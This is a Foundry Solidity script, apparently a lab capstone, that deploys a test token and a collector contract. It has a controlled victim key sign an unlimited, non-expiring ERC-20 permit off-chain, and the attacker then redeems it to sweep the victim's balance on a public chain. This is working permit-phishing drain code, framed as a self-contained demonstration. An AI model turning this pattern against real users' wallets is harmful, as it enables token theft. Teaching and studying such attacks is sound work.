// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Script, console} from "forge-std/Script.sol";
import {LabToken, Collector} from "../src/Lab.sol";

/// The public-chain capstone: the same two paths, but as REAL transactions anyone can open on a
/// block explorer. Deploys a lab token, funds a lab victim we control, and shows the permit path
/// end to end. No third party is involved and no live asset is at risk.
///
///   forge script script/Capstone.s.sol:Capstone --rpc-url $RPC --private-key $PK --broadcast --legacy
contract Capstone is Script {
    function run() external {
        uint256 pk = vm.envUint("PK");
        address deployer = vm.addr(pk);
        uint256 victimPk = vm.envOr("VICTIM_PK", uint256(0xA11CE));
        address victim = vm.addr(victimPk);

        vm.startBroadcast(pk);
        LabToken token = new LabToken();
        Collector collector = new Collector();
        token.mint(victim, 10_000e18);
        vm.stopBroadcast();

        console.log("token      :", address(token));
        console.log("collector  :", address(collector));
        console.log("victim     :", victim);
        console.log("deployer   :", deployer);
        console.log("victim balance before :", token.balanceOf(victim) / 1e18);
        console.log("allowance before      :", token.allowance(victim, address(collector)));

        // The victim signs OFF-CHAIN. Nothing is broadcast here — this is the whole point.
        uint256 value = type(uint256).max;
        uint256 deadline = type(uint256).max;
        bytes32 digest = keccak256(abi.encodePacked(
            "\x19\x01", token.DOMAIN_SEPARATOR(),
            keccak256(abi.encode(
                keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"),
                victim, address(collector), value, token.nonces(victim), deadline))));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(victimPk, digest);
        console.log("--- victim has signed. allowance on-chain is still:",
                    token.allowance(victim, address(collector)));

        // The attacker redeems it. ONE transaction, sent by the attacker, not the victim.
        vm.startBroadcast(pk);
        collector.redeemAndSweep(address(token), victim, value, deadline, v, r, s);
        vm.stopBroadcast();

        console.log("victim balance after  :", token.balanceOf(victim) / 1e18);
        console.log("attacker balance after:", token.balanceOf(collector.attacker()) / 1e18);
        console.log("permit nonce consumed :", token.nonces(victim));
    }
}
